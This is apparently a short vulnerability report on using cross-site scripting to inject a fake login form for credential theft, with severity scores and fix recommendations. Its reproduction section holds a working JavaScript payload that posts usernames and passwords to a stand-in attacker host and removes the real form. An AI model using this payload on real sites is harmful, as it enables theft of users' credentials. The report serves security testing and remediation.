# XSS - Phishing and Credential Theft with XSS

**Title:** XSS Used for Credential Harvesting

**Severity:** High

**Impact:** High

**Exploitability:** High

**CVSS Base Score:** 6.1

**CVSS v3 Vector:** CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N

**Vulnerability Type:** Cross-Site Scripting

**Target:** Reflected or stored input that can inject forms

## Impact

Users tricked into submitting credentials to attacker, session hijacking.

## Description

Inject fake login forms that exfiltrate data, combined with cleaning original content.

## Steps to Reproduce

Inject phishing form:

document.write('<h3>Please login to continue</h3><form action=http://attacker-ip><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');

document.getElementById('originalFormId').remove();

Use HTML comments to clean up.

Backend harvester example logs to file and redirects.

## Recommendation

Output encoding, CSP to block inline scripts and external forms where possible, input sanitization.

## References

PortSwigger XSS labs and PayloadsAllTheThings.